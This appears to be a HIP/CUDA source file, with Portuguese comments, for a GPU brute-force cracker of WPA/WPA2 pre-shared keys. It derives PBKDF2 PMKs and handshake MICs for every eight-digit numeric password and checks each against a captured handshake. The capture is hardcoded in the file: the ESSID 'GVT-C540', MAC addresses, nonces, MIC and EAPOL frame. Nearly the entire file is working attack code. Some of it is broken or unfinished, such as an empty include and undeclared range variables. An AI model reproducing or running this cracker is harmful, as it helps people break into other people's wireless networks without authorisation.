#include "hip/hip_runtime.h"

#include "hip/hip_runtime.h"
#include ""
 
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <locale.h>
 
#include "libraries/wpapsk.h" 
#include "libraries/md5.h"
#include "libraries/sha1.h"
 
 
#include "libraries/common.h" 
#include "libraries/others.h"
  
   
    

__constant__ wpapsk_cap cap[1];

__device__ static void preproc(const uint8_t * key, uint32_t keylen,
	uint32_t * state, uint32_t padding)
{
	int i;
	uint32_t W[16], temp;

	for (i = 0; i < 16; i++)
		W[i] = padding;

	for (i = 0; i < keylen; i++)
		XORCHAR_BE(W, i, key[i]);

	uint32_t A = INIT_A;
	uint32_t B = INIT_B;
	uint32_t C = INIT_C;
	uint32_t D = INIT_D;
	uint32_t E = INIT_E;

	SHA1(A, B, C, D, E, W);

	state[0] = A + INIT_A;
	state[1] = B + INIT_B;
	state[2] = C + INIT_C;
	state[3] = D + INIT_D;
	state[4] = E + INIT_E;

}

__device__ static void hmac_sha1(uint32_t * output,
	uint32_t * ipad_state, uint32_t * opad_state, const uint8_t * salt,
	int saltlen, uint8_t add)
{
	int i;
	uint32_t temp, W[16];
	uint32_t A, B, C, D, E;
	uint8_t buf[64];
	uint32_t *src = (uint32_t *)buf;
	i = 64 / 4;
	while (i--)
		*src++ = 0;
	memcpy(buf, salt, saltlen);
	buf[saltlen + 4] = 0x80;
	buf[saltlen + 3] = add;
	PUT_WORD_32_BE((64 + saltlen + 4) << 3, buf, 60);

	A = ipad_state[0];
	B = ipad_state[1];
	C = ipad_state[2];
	D = ipad_state[3];
	E = ipad_state[4];

	for (i = 0; i < 16; i++)
		GET_WORD_32_BE(W[i], buf, i * 4);

   	SHA1(A, B, C, D, E, W);

	A += ipad_state[0];
	B += ipad_state[1];
	C += ipad_state[2];
	D += ipad_state[3];
	E += ipad_state[4];

	PUT_WORD_32_BE(A, buf, 0);
	PUT_WORD_32_BE(B, buf, 4);
	PUT_WORD_32_BE(C, buf, 8);
	PUT_WORD_32_BE(D, buf, 12);
	PUT_WORD_32_BE(E, buf, 16);

	buf[20] = 0x80;
	PUT_WORD_32_BE(0x2A0, buf, 60);

	A = opad_state[0];
	B = opad_state[1];
	C = opad_state[2];
	D = opad_state[3];
	E = opad_state[4];

	for (i = 0; i < 16; i++)
		GET_WORD_32_BE(W[i], buf, i * 4);

	SHA1short(A, B, C, D, E, W);

	A += opad_state[0];
	B += opad_state[1];
	C += opad_state[2];
	D += opad_state[3];
	E += opad_state[4];

	output[0] = A;
	output[1] = B;
	output[2] = C;
	output[3] = D;
	output[4] = E;
}



__device__ static void big_hmac_sha1(uint32_t * input, uint32_t inputlen,
	uint32_t * ipad_state, uint32_t * opad_state, uint32_t * tmp_out)
{
	int i, lo;
	uint32_t temp, W[16];
	uint32_t A, B, C, D, E;

	for (i = 0; i < 5; i++)
		W[i] = input[i];

	for (lo = 1; lo < ITERATIONS; lo++) {

		A = ipad_state[0];
		B = ipad_state[1];
		C = ipad_state[2];
		D = ipad_state[3];
		E = ipad_state[4];

		W[5] = 0x80000000;
		W[15] = 0x2A0;

		SHA1short(A, B, C, D, E, W);

		A += ipad_state[0];
		B += ipad_state[1];
		C += ipad_state[2];
		D += ipad_state[3];
		E += ipad_state[4];

		W[0] = A;
		W[1] = B;
		W[2] = C;
		W[3] = D;
		W[4] = E;
		W[5] = 0x80000000;
		W[15] = 0x2A0;

		A = opad_state[0];
		B = opad_state[1];
		C = opad_state[2];
		D = opad_state[3];
		E = opad_state[4];

		SHA1short(A, B, C, D, E, W);
		 
		A += opad_state[0];
		B += opad_state[1];
		C += opad_state[2];
		D += opad_state[3];
		E += opad_state[4];

		W[0] = A;
		W[1] = B;
		W[2] = C;
		W[3] = D;
		W[4] = E;

		tmp_out[0] ^= A;
		tmp_out[1] ^= B;
		tmp_out[2] ^= C;
		tmp_out[3] ^= D;
		tmp_out[4] ^= E;
	} 

	for (i = 0; i < 5; i++)
		tmp_out[i] = SWAP(tmp_out[i]);
}


__device__ void pbkdf2(const uint8_t * pass, int passlen, const uint8_t *essid,
	int sessid, uint8_t * out)
{
	uint32_t ipad_state[5];
	uint32_t opad_state[5];
	uint32_t tmp_out[5];

	preproc(pass, passlen, ipad_state, 0x36363636);
	preproc(pass, passlen, opad_state, 0x5c5c5c5c);

	hmac_sha1(tmp_out, ipad_state, opad_state, essid, sessid, 0x01);

	big_hmac_sha1(tmp_out, SHA1_DIGEST_LENGTH, ipad_state, opad_state,
		tmp_out);

	memcpy(out, tmp_out, 20);

	hmac_sha1(tmp_out, ipad_state, opad_state, essid, sessid, 0x02);

	big_hmac_sha1(tmp_out, SHA1_DIGEST_LENGTH, ipad_state, opad_state,
		tmp_out);

	memcpy(out + 20, tmp_out, 12);
} 

__device__ void PRF512(uint8_t *pmk, uint8_t *mic)
{
	// PKE e PTK usados no c�lculo do MIC
	uint8_t pke[100];
	uint8_t ptk[80];

	// Constroe o buffer de expans�o da chave
	memcpy(pke, "Pairwise key expansion", 23);
	// Adiciona os MACs
	if (cudaMemCmp(cap[0].smac, cap[0].amac, 6) < 0)
	{
		memcpy(pke + 23, cap[0].smac, 6);
		memcpy(pke + 29, cap[0].amac, 6);
	}
	else
	{
		memcpy(pke + 23, cap[0].amac, 6);
		memcpy(pke + 29, cap[0].smac, 6);
	}

	// Adiciona os Nonces
	if (cudaMemCmp(cap[0].snonce, cap[0].anonce, 32) < 0)
	{
		memcpy(pke + 35, cap[0].snonce, 32);
		memcpy(pke + 67, cap[0].anonce, 32);
	}
	else
	{
		memcpy(pke + 35, cap[0].anonce, 32);
		memcpy(pke + 67, cap[0].snonce, 32);
	}

	// Calcula o PTK
	for (int i = 0; i < 4; i++)
	{
		pke[99] = i;
		sha1_hmac(pmk, 32, pke, 100, ptk + i * 20);
	}

	// Calcula o MIC
	if (cap[0].keyver == 1)
		md5_hmac(ptk, 16, cap[0].eapol, cap[0].eapol_size, mic);
	else
		sha1_hmac(ptk, 16, cap[0].eapol, cap[0].eapol_size, mic);
}



__device__ void process(wpapsk_password *password, wpapsk_result *result, int id)
{
	//if (0 < id && id < 34)
	//{
		pbkdf2(password->v, password->length,
			cap[0].essid, cap[0].sessid, result->pmk);

		PRF512(result->pmk, result->mic);
	//}

//	if (password->n == 3003000669)
//		printf("aqui\n");
}

 
__global__ void myKernel(wpapsk_password *password, wpapsk_result *result)
{ 
	int idx = blockIdx.x * blockDim.x + threadIdx.x;
	// O ID est� fora do intervalo?
	//if (idx < PWD_BATCH_SIZE_GPU)
	//printf("%i\n", idx);
	//for (int j = 0; j < WORK_BY_THREAD; j++)
	//{

		//int id = idx + (THREADS * j);
		//printf("%i\n", idx);
		process(&password[idx], &result[idx], idx);
	//}
	
}



void print_work(unsigned long* pfpwd, unsigned long* plpwd, wpapsk_cap* phdsk)
{
	int i = 0;

	printf("----------------------------------------\n");
	printf("password range: %08lu to %08lu\n", *pfpwd, *plpwd);
	printf("essid: %s\n", phdsk->essid);
	printf("s-mac: %02x", phdsk->smac[0]);
	for (i = 1; i<6; ++i)
		printf(":%02x", phdsk->smac[i]);
	putchar('\n');
	printf("a-mac: %02x", phdsk->amac[0]);
	for (i = 1; i<6; ++i)
		printf(":%02x", phdsk->amac[i]);
	putchar('\n');
	printf("s-nonce: ");
	for (i = 0; i<32; ++i)
		printf("%02x", phdsk->snonce[i]);
	putchar('\n');
	printf("a-nonce: ");
	for (i = 0; i<32; ++i)
		printf("%02x", phdsk->anonce[i]);
	putchar('\n');
	printf("key version: %u (%s)\n", phdsk->keyver, phdsk->keyver == 1 ? "HMAC-MD5" : "HMAC-SHA1-128");
	printf("key mic: ");
	for (i = 0; i<16; ++i)
		printf("%02x", phdsk->keymic[i]);
	putchar('\n');
	printf("eapol frame content size: %u bytes\n", phdsk->eapol_size);
	printf("eapol frame content (with mic reset): \n");
	for (i = 1; i <= phdsk->eapol_size; ++i)
		printf("%02x%c", phdsk->eapol[i - 1], i % 16 == 0 ? '\n' : ' ');
	putchar('\n');
	printf("----------------------------------------\n");
}

  
int main(int argc, char** argv)
{
	hipSetDevice(0);

	setlocale(LC_ALL, "Portuguese");

	/* estrutura CUDA que permite armazenar tempo */
	hipEvent_t start, stop;
	float totalTime = 0, keys = 0, time = 0;

	wpapsk_cap *link = (wpapsk_cap *)calloc(1, sizeof(wpapsk_cap));

	link->keyver = 1;
	link->sessid = strlen("GVT-C540");
	memcpy(link->essid, "GVT-C540", link->sessid);
	memcpy(link->amac, "\x2C\x39\x96\x83\xC5\x44", sizeof(link->amac));
	memcpy(link->smac, "\x60\x57\x18\x25\xEA\xA9", sizeof(link->smac));

	memcpy(link->anonce, "\x26\x68\xD3\xD2\xD3\xF5\x9C\x38\xB6\xB8\xE2\xEA\x43\x9F\xB0\x8F"
		"\x5E\x70\x27\x27\x11\xE1\xE3\xA1\xD4\x16\x86\x6E\x11\xAC\xFD\x93", sizeof(link->anonce));
	memcpy(link->snonce, "\xC8\xD1\x3A\x0B\xDB\x0D\x13\xF1\x5C\xF8\x76\x14\x2E\x1D\x69\x2E"
		"\x3B\xA8\x8B\x14\xBB\xF6\xE4\xDC\xFB\xF4\x5D\x48\xE1\x67\xD9\x9E", sizeof(link->snonce));
	memcpy(link->keymic, "\x8B\x33\x08\x03\x35\xE9\x50\x31\x80\xB4\xE3\x46\xB9\x61\x67\x2B", sizeof(link->keymic));

	link->eapol_size = 125;
	memcpy(link->eapol, "\x01\x03\x00\x79\xFE\x01\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x01\xC8\xD1\x3A\x0B\xDB\x0D\x13\xF1\x5C\xF8\x76\x14\x2E\x1D\x69"
		"\x2E\x3B\xA8\x8B\x14\xBB\xF6\xE4\xDC\xFB\xF4\x5D\x48\xE1\x67\xD9"
		"\x9E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x1A\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x01"
		"\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x3C\x00", link->eapol_size);

	 
	float gpu_speed = 0;

	// Imprime as informa��es recebidas
	print_work(&first_pwd, &last_pwd, link);

	// Senha em formato de string
	char key[64];
	memset(key, 0, sizeof(key));



	
	int sizeKey, notProcess = 0;

	wpapsk_password *cuda_password;
	wpapsk_result *cuda_result;

	hipMemcpyToSymbol(HIP_SYMBOL(cap), link, sizeof(wpapsk_cap));


	/* Inicia o cronometro e registra o tempo */
	hipEventCreate(&start);
	hipEventCreate(&stop);

	// Aloca mem�ria na CPU
	wpapsk_password *password = (wpapsk_password *)calloc(SIZE_VECTOR, sizeof(wpapsk_password));
	wpapsk_result *result = (wpapsk_result *)calloc(SIZE_VECTOR, sizeof(wpapsk_result));


	// Aloca mem�ria na GPU
	hipMalloc(&cuda_password, sizeof(wpapsk_password) * SIZE_VECTOR);
	hipMalloc(&cuda_result, sizeof(wpapsk_result) * SIZE_VECTOR);


	// Repetidamente obter intervalos de senha para despachar para as GPUs
	for (unsigned long begin = first_pwd, end = begin + SIZE_VECTOR;
		begin <= last_pwd; 
		begin += SIZE_VECTOR, end = begin + SIZE_VECTOR)
	{
		hipEventRecord(start);

		unsigned long pass = begin;
		 
		for (int i = 0; i < SIZE_VECTOR; i++)
		{
			sprintf(key, "%08lu", pass);
			sizeKey = strlen(key);
			memcpy(password[i].v, key, sizeKey);
			password[i].length = sizeKey;
			password[i].n = pass++;
		}

		 
		hipMemcpy(cuda_password, password, sizeof(wpapsk_password) * SIZE_VECTOR, hipMemcpyHostToDevice);

		for (int i = 0; i < WORK_BY_TIME; i++)
		{
			myKernel << <BLOCKS, THREADS >> > (&cuda_password[i * THREADS * BLOCKS],
				&cuda_result[i * THREADS * BLOCKS]);
			 
			hipDeviceSynchronize();
		}
		       
		hipMemcpy(result, cuda_result, sizeof(wpapsk_result) * SIZE_VECTOR, hipMemcpyDeviceToHost);
		

		/* Para o cronometro e registra o tempo */
		hipEventRecord(stop);
		hipEventSynchronize(stop);
		hipEventElapsedTime(&time, start, stop);
		totalTime += (time / 1000);


		keys += (end - begin);
		gpu_speed = (keys / totalTime);


		
		//Sleep(30000);

		for (int i = 0; i < SIZE_VECTOR; i++)
		{
			if (memcmp(result[i].pmk, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16) == 0)
				notProcess++;

			if (memcmp(result[i].mic, link->keymic, 16) == 0)
			{
				printf("\n\n!!! Senha encontrada !!! [%.*s]\n", password[i].length, password[i].v);

				printf("Tempo total: %.2f segundos\n", totalTime);

				goto fim;
			}
		}

		printf("\r%08.1f PMK/s CUR: %08lu, Chaves N�o Processadas: %i", gpu_speed, end, notProcess);
	}


	printf("\n\nSenha n�o encontrada\n");

	 
	fim:
	// Libera recursos
	hipEventDestroy(start);
	hipEventDestroy(stop);

	hipFree(cuda_result);
	hipFree(cuda_password);
	free(password);
	free(result);

	system("PAUSE");
	return 0;
}
